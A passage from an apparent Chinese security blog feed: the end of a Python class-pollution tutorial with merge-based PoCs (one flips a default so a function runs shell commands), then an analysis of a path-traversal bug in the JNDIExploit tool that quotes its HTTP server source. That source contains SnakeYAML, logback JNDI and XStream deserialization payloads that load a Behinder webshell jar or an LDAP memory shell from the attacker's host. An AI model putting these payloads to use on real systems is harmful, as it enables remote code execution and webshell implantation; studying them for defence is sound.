class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;requests&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;get&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(requests.get)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure>
<p><code>import</code> 顺序没有影响</p>
<p>当然，在没有 <code>import sys</code> 的情况下，应该如何去拿到modules<br>可以通过 <code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code> 获取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line">instance.a = requests</span><br><span class="line"><span class="comment"># requests</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__spec__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;modules&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;requests&quot;</span>:&#123;</span><br><span class="line">                                <span class="string">&quot;b&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(requests.b)</span><br><span class="line"><span class="comment">#123</span></span><br></pre></td></tr></table></figure>
<h2 id="形参默认值"><a href="#形参默认值" class="headerlink" title="形参默认值"></a>形参默认值</h2><p><code>__defaults__</code> 中存储着函数参数的默认值，可以通过污染该值进行一些攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#kaikaix</span></span><br></pre></td></tr></table></figure>
<p>上面记录一下原理，其他trick可以看<br><a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
        <tag>ctf</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDIExploit路径穿越漏洞</title>
    <url>/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h2><span id="more"></span>
<p>该工具启动命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure><br>默认会启动http服务器<br>该工具http服务器相应的代码位于项目<br><code>src/main/java/com/feihong/ldap/HTTPServer.java</code><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.feihong.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.file.FileReader;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.CommandTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.DnslogTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.ReverseShellTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Cache;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Config;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.reflect.FieldUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cwd</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(Config.httpPort), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] New HTTP Request From &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot;  &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> httpExchange.getRequestURI().getPath();</span><br><span class="line">                    <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.class&quot;</span>))&#123;</span><br><span class="line">                        handleClassRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.wsdl&quot;</span>))&#123;</span><br><span class="line">                        handleWSDLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.jar&quot;</span>))&#123;</span><br><span class="line">                        handleJarRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;/xxelog&quot;</span>))&#123;</span><br><span class="line">                        handleXXELogRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.sql&quot;</span>))&#123;</span><br><span class="line">                        handleSQLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (path.endsWith(<span class="string">&quot;.groovy&quot;</span>))&#123;</span><br><span class="line">                        handlerGroovyRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                        handleXMLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">                        handleTXTRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.yml&quot;</span>))&#123;</span><br><span class="line">                        handleYmlRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        handleFileRequest(httpExchange);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] HTTP Server Start Listening on &quot;</span> + Config.httpPort + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleYmlRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">YamlName</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://&quot;</span>+ Config.ip +<span class="string">&quot;:&quot;</span>+ Config.httpPort + <span class="string">&quot;/behinder3.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  dataSourceName: \&quot;ldap://127.0.0.1:1389/basic/TomcatMemShell3\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (YamlName.equalsIgnoreCase(<span class="string">&quot;snake&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"><span class="comment">//            exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);</span></span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            exchange.getResponseBody().write(yaml.getBytes(&quot;UTF-8&quot;));</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + YamlName + <span class="string">&quot;.yml&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleTXTRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">txtname</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (txtname.equalsIgnoreCase(<span class="string">&quot;isok&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="string">&quot;success!&quot;</span>.getBytes();</span><br><span class="line">            exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + txtname + <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXMLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name=\&quot;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span>+ Config.ldapPort + <span class="string">&quot;/TomcatBypass/TomcatMemshell3\&quot; as=\&quot;appName\&quot; /&gt;\n&lt;/configuration&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;value class=\&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;dataSource class=\&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;is class=\&quot;javax.crypto.CipherInputStream\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;cipher class=\&quot;javax.crypto.NullCipher\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;initialized&gt;false&lt;/initialized&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;opmode&gt;0&lt;/opmode&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;serviceIterator class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;iter class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;iter class=\&quot;java.util.Collections$EmptyIterator\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;next class=\&quot;com.sun.rowset.JdbcRowSetImpl\&quot; serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;dataSource&gt;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:1389/basic/TomcatMemShell3&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    